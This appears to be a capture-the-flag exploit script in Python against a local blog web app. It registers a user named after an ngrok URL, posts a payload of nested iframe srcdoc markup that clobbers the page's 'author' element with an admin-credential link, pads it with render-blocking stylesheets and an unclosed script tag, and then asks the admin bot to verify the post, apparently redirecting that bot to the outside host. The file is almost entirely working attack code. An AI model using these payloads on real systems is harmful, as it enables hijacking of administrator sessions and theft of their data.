import requests

url = "http://localhost:8000"

redirect_url = "/617d-103-149-159-222.ngrok-free.app"

s = requests.Session()

s.post(url + "/register", data={"username": redirect_url, "password": "password"})
s.post(url + "/login", data={"username": redirect_url, "password": "password"})
s.post(
    url + "/create",
    data={
        "title": "Title",
        "content": """<iframe name=rows srcdoc=" <iframe name=rows srcdoc=&quot; <a id='author' href='//admin:a@me.com'></a> &quot;></iframe> "></iframe></p>"""
        + """<link rel="stylesheet" blocking="render" href="/css/bootstrap.min.css">
<link rel="stylesheet" blocking="render" href="/css/bootstrap-icons.css">
<link rel="stylesheet" blocking="render" href="/css/home.css">
<link rel="stylesheet" blocking="render" href="/css/posts.css">
<link rel="stylesheet" blocking="render" href="/css/search.css">"""
        * 100
        + """<script type="text/plain">""",
    },
)
uid = s.get(url + "/posts").text
uid = uid[uid.index('a href="/post/') :][14:50]
print(uid)
s.post(url + "/verify", data={"id": uid})
